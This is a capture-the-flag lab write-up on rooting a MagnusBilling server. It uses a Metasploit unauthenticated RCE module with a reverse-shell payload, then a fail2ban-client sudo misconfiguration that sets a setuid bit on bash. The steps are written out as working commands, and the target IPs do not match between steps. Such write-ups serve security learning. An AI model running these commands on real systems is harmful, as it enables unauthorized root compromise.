
---

# Capture-the-Flag (CFT) Exploitation Documentation

**Author:** \[Goodluck Temilolu Oyebisi ]
**Date:** August 2025
**Platform:** Linux / Kali / Metasploit / Python3 / Fail2Ban

---

## Overview

This documentation presents a step-by-step breakdown of a **realistic penetration test scenario** on a vulnerable MagnusBilling instance, culminating in **privilege escalation to root**. It demonstrates careful exploitation while following ethical guidelines for legal testing environments.

---

## Target

* **IP:** 10.10.57.157
* **Services Identified:** HTTP (mbilling web app), Asterisk Call Manager (TCP 5038)
* **Tools Used:** Metasploit, SQLMap, Python, Fail2Ban

---

## Step 1: Reconnaissance

1. Enumerated web endpoints using **SQLMap** to test for SQL injection:

   ```bash
   sqlmap -u "http://10.10.30.141/mbilling" --crawl=3 --batch --random-agent
   ```
2. Discovered login endpoint using HTTP POST request:

   ```http
   POST /mbilling/index.php/authentication/login
   ```
3. Identified Asterisk Call Manager on **port 5038** via Telnet.

---

## Step 2: Exploitation

### 2.1 Remote Code Execution (RCE)

* Used Metasploit module: `exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258`
* Configured reverse TCP payload:

  ```text
  RHOST = 10.10.57.157
  LHOST = 10.9.1.109
  ```
* Confirmed vulnerability via **command injection test**.
* Spawned a Meterpreter session, then dropped into a shell:

  ```bash
  meterpreter > shell
  ```

---

## Step 3: Privilege Escalation via Fail2Ban Misconfiguration

1. Checked sudo privileges:

   ```bash
   sudo -l
   ```

   Output showed `NOPASSWD` for `/usr/bin/fail2ban-client`.

2. Exploited Fail2Ban jail `asterisk-iptables`:

   ```bash
   sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
   sudo /usr/bin/fail2ban-client set asterisk-iptables banip 8.8.8.8
   ```

3. Elevated privileges by spawning a **root shell**:

   ```bash
   /bin/bash -p
   ```

---

## Step 4: Post-Exploitation Notes

* Verified root access:

  ```bash
  whoami  # root
  ```
* Highlighted **setuid-based escalation** vulnerability due to misconfigured Fail2Ban jail.
* Emphasized **ethical testing principles**: all exploits performed on authorized lab environments.

---

## Key Takeaways

1. **Check for misconfigured sudo privileges** on automated tools like Fail2Ban.
2. Combining **RCE with sudo misconfigurations** can yield root access quickly.
3. Ethical and controlled testing environments are essential for learning and responsible disclosure.

---

## Tools & References

* [Metasploit Framework](https://metasploit.help.rapid7.com/docs)
* [SQLMap](https://sqlmap.org/)
* [Fail2Ban](https://www.fail2ban.org/)

---

**Disclaimer:** This documentation is intended for **educational purposes** and testing in **authorized environments only**. Unauthorized exploitation is illegal and unethical.

--